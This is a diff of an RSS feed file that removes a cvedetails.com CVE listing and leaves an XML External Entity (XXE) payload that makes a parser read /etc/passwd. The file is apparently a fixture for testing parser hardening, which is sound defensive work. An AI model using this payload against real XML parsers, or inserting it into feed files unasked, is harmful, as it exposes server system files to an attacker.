@@ -2,18 +2,7 @@
   <rss version="2.0">
     <!DOCTYPE foo [  
       <!ELEMENT foo ANY >
-      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
-    
-    <channel>
-    <title>Latest security vulnerabilities  (CSRF)</title>
-    <link>http://www.cvedetails.com</link>
-    <description>Security vulnerability feeds by http://www.cvedetails.com</description>
-    <language>en-us</language>
-    <item>
-      <title>CVE-2016-4506</title>
-      <description>Cross-site request forgery (CSRF) vulnerability on Resource Data Management (RDM) Intuitive 650 TDB Controller devices before 2.1.24 allows remote authenticated users to hijack the authentication of arbitrary users. (CVSS:0.0) (Last Update:2016-05-30)</description>
-      <link>http://www.cvedetails.com/cve/CVE-2016-4506/</link>
-      <pubDate>2016-05-30</pubDate>
-    </item>
-    </channel>
+      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+      
+      <foo>&xxe;</foo>
   </rss>
